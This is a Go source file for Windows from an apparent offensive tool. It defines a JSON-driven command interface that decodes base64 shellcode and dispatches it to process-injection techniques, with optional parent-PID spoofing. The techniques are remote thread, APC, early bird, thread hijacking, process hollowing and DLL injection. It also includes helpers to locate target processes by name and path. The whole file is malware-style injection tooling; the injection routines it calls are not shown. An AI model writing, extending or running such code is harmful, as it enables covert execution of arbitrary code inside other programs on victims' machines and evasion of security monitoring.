// +build windows

package injection

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Command represents an injection command
type Command struct {
	// Method is the injection method name (e.g., "remote_thread", "apc", "early_bird")
	Method string `json:"method"`

	// TargetPID is the target process ID (for existing process injection)
	TargetPID int `json:"target_pid,omitempty"`

	// TargetProcessName is the name of the target process (will be searched by name)
	TargetProcessName string `json:"target_process_name,omitempty"`

	// TargetPath is the path to the target executable (for process hollowing/early bird)
	TargetPath string `json:"target_path,omitempty"`

	// Shellcode is the base64-encoded shellcode
	Shellcode string `json:"shellcode,omitempty"`

	// DLLPath is the path to the DLL file (for DLL injection)
	DLLPath string `json:"dll_path,omitempty"`

	// ParentPID is the parent process ID to spoof (optional)
	ParentPID int `json:"parent_pid,omitempty"`
}

// CommandResult represents the result of an injection command
type CommandResult struct {
	// Success indicates if the injection was successful
	Success bool `json:"success"`

	// ProcessID is the ID of the injected/spawned process
	ProcessID uint32 `json:"process_id,omitempty"`

	// ThreadID is the ID of the created thread (if applicable)
	ThreadID uint32 `json:"thread_id,omitempty"`

	// Error contains any error message
	Error string `json:"error,omitempty"`

	// Message contains additional information
	Message string `json:"message,omitempty"`
}

// ExecuteCommand executes an injection command from JSON
func ExecuteCommand(jsonCmd string) (*CommandResult, error) {
	var cmd Command
	if err := json.Unmarshal([]byte(jsonCmd), &cmd); err != nil {
		return &CommandResult{
			Success: false,
			Error:   fmt.Sprintf("failed to parse command: %v", err),
		}, err
	}

	return ExecuteCommandStruct(&cmd)
}

// ExecuteCommandStruct executes an injection command from a Command struct
func ExecuteCommandStruct(cmd *Command) (*CommandResult, error) {
	// Parse the injection method
	method, err := parseMethod(cmd.Method)
	if err != nil {
		return &CommandResult{
			Success: false,
			Error:   err.Error(),
		}, err
	}

	// Build the configuration
	config := &Config{
		TargetPID:  cmd.TargetPID,
		TargetPath: cmd.TargetPath,
		DLLPath:    cmd.DLLPath,
		ParentPID:  cmd.ParentPID,
	}

	// Decode shellcode if provided
	if cmd.Shellcode != "" {
		shellcode, err := base64.StdEncoding.DecodeString(cmd.Shellcode)
		if err != nil {
			return &CommandResult{
				Success: false,
				Error:   fmt.Sprintf("failed to decode shellcode: %v", err),
			}, err
		}
		config.Shellcode = shellcode
	}

	// If TargetProcessName is specified, find the PID
	if cmd.TargetProcessName != "" && cmd.TargetPID == 0 {
		pid, err := FindProcessByName(cmd.TargetProcessName)
		if err != nil {
			return &CommandResult{
				Success: false,
				Error:   fmt.Sprintf("failed to find process %s: %v", cmd.TargetProcessName, err),
			}, err
		}
		config.TargetPID = int(pid)
	}

	// Execute the injection
	result, err := Execute(method, config)
	if err != nil {
		return &CommandResult{
			Success: false,
			Error:   err.Error(),
		}, err
	}

	return &CommandResult{
		Success:   result.Success,
		ProcessID: result.ProcessID,
		ThreadID:  result.ThreadID,
		Error:     result.Error,
		Message:   fmt.Sprintf("Successfully injected using %s method", method),
	}, nil
}

// parseMethod parses the injection method name
func parseMethod(name string) (InjectionMethod, error) {
	switch strings.ToLower(name) {
	case "remote_thread", "remotethread", "remote-thread", "createthread":
		return MethodRemoteThread, nil
	case "apc", "queueapc":
		return MethodAPC, nil
	case "early_bird", "earlybird", "early-bird":
		return MethodEarlyBird, nil
	case "thread_hijack", "threadhijack", "thread-hijack", "hijack":
		return MethodThreadHijack, nil
	case "process_hollowing", "processhollowing", "process-hollowing", "hollowing", "hollow":
		return MethodProcessHollowing, nil
	case "dll", "dll_injection", "dllinjection", "dll-injection", "loadlibrary":
		return MethodDLLInjection, nil
	default:
		return 0, fmt.Errorf("unknown injection method: %s", name)
	}
}

// ListMethods returns a list of available injection methods
func ListMethods() []MethodInfo {
	return []MethodInfo{
		{
			Name:        "remote_thread",
			Description: "Remote Thread Injection - Creates a remote thread in target process",
			RequiresPID: true,
			RequiresShellcode: true,
		},
		{
			Name:        "apc",
			Description: "APC Injection - Queues shellcode to thread's APC queue",
			RequiresPID: true,
			RequiresShellcode: true,
		},
		{
			Name:        "early_bird",
			Description: "Early Bird APC - Creates suspended process and injects via APC",
			RequiresPath: true,
			RequiresShellcode: true,
		},
		{
			Name:        "thread_hijack",
			Description: "Thread Hijacking - Hijacks existing thread to execute shellcode",
			RequiresPID: true,
			RequiresShellcode: true,
		},
		{
			Name:        "process_hollowing",
			Description: "Process Hollowing - Creates process, unmaps it, replaces with shellcode",
			RequiresPath: true,
			RequiresShellcode: true,
		},
		{
			Name:        "dll",
			Description: "DLL Injection - Injects DLL via LoadLibrary",
			RequiresPID: true,
			RequiresDLL: true,
		},
	}
}

// MethodInfo contains information about an injection method
type MethodInfo struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	RequiresPID bool   `json:"requires_pid"`
	RequiresPath bool  `json:"requires_path"`
	RequiresShellcode bool `json:"requires_shellcode"`
	RequiresDLL bool   `json:"requires_dll"`
}

// Helper function to parse PID from string
func ParsePID(pidStr string) (int, error) {
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return 0, fmt.Errorf("invalid PID: %s", pidStr)
	}
	if pid <= 0 {
		return 0, fmt.Errorf("PID must be positive: %d", pid)
	}
	return pid, nil
}

// GetProcessPath returns the full path of a process by PID
func GetProcessPath(pid uint32) (string, error) {
	const PROCESS_QUERY_INFORMATION = 0x0400
	const PROCESS_VM_READ = 0x0010

	// Open the process handle
	handle, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
	if err != nil {
		return "", fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(handle)

	// Try to get the process path using QueryFullProcessImageName
	var pathBuf [260]uint16
	var size uint32 = 260

	// Load the QueryFullProcessImageName function
	kernel32 := windows.MustLoadDLL("kernel32.dll")
	procQueryFullProcessImageName := kernel32.MustFindProc("QueryFullProcessImageNameW")

	ret, _, err := procQueryFullProcessImageName.Call(
		uintptr(handle),
		0,
		uintptr(unsafe.Pointer(&pathBuf[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret == 0 {
		// Fallback to GetModuleFileNameEx
		procGetModuleFileNameEx := kernel32.MustFindProc("GetModuleFileNameExW")
		ret, _, err = procGetModuleFileNameEx.Call(
			uintptr(handle),
			0,
			uintptr(unsafe.Pointer(&pathBuf[0])),
			uintptr(len(pathBuf)),
		)
		if ret == 0 {
			return "", fmt.Errorf("failed to get process path: %v", err)
		}
	}

	return syscall.UTF16ToString(pathBuf[:size]), nil
}